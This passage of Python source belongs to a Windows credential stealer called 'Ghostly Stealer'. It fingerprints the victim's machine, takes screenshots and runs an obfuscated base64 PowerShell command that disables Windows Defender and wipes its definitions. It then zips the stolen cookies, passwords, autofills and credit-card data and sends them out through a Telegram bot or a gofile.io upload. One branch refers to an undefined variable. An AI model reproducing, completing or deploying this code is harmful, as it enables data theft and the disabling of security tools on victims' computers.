    totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()

    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()     
    mac = get_mac_address()
    result = f"💻Username: {username.upper()}\n💻Ram: {totalMemory}\n💻GPU: {GPUm}\n💻Mac: {mac}\n💻UID: {current_machine_id}\n"
    return result
def capture():
    temp_photo_path = f"{temp}/screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(temp_photo_path)
    shutil.move(temp_photo_path, os.path.join(temp, "Ghostly_"+username))
    try:
        os.remove(temp_photo_path)
    except:pass

def upload_to_gofile(zip_file_name):
    try:
        response = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(zip_file_name, 'rb')})
        if response.status_code == 200:
            download_page_url = response.json()["data"]["downloadPage"]
            return download_page_url
        else:
            return None
    except Exception as e:
        return None

def send_telegram_message(link):
    globalinfo = globalInfo()
    machineinf = machineinfo()
    text = f"Ghostly Stealer Found A New Victim !\n\n{globalinfo}\n{machineinf}🌐Cookies Found: {CookiCount}\n🌐Passwords Found: {PassCount}\n🌐Histories Found: {Hiscount}\n🌐Autofills Found: {AutofillCount}\n🌐CreditCards Found: {CreCount}\n\nLink Download Data:{link}"
    bot.send_message(chat_id=chatyd, text=text, parse_mode="HTML")
def DisableDefender(): # Tries to disable the defender
    command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
    subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
def main():
    global chatyd
    install_missing_libraries()
    DisableDefender()
    makedir()
    capture()
    GatherAll()
    folder_path = os.path.join(temp, "Ghostly_" + username)
    zip_file_name =  os.path.join(local,"Ghostly_" + username)
    shutil.make_archive(zip_file_name, 'zip', folder_path)
    shutil.rmtree(folder_path)
    zip_file_size = os.path.getsize(zip_file_name+".zip") / (1024 * 1024)
    if zip_file_size < 40:
            globalinfo = globalInfo()
            machineinf = machineinfo()
            phile = os.path.join(local, f"Ghostly_{username}.zip")
            text = f"Ghostly Stealer Found A New Victim !\n\n{globalinfo}\n{machineinf}🌐Cookies Found: {CookiCount}\n🌐Passwords Found: {PassCount}\n🌐Histories Found: {Hiscount}\n🌐Autofills Found: {AutofillCount}\n🌐CreditCards Found: {CreCount}"
            bot.send_document(chat_id=chatyd, document=open(phile, 'rb'),caption=text)
            os.remove(phile)
    else:
        link = upload_to_gofile(zip_file_name+".zip")
        if link:
            send_telegram_message(link)
            os.remove(phile)
if __name__ == "__main__":
    main()
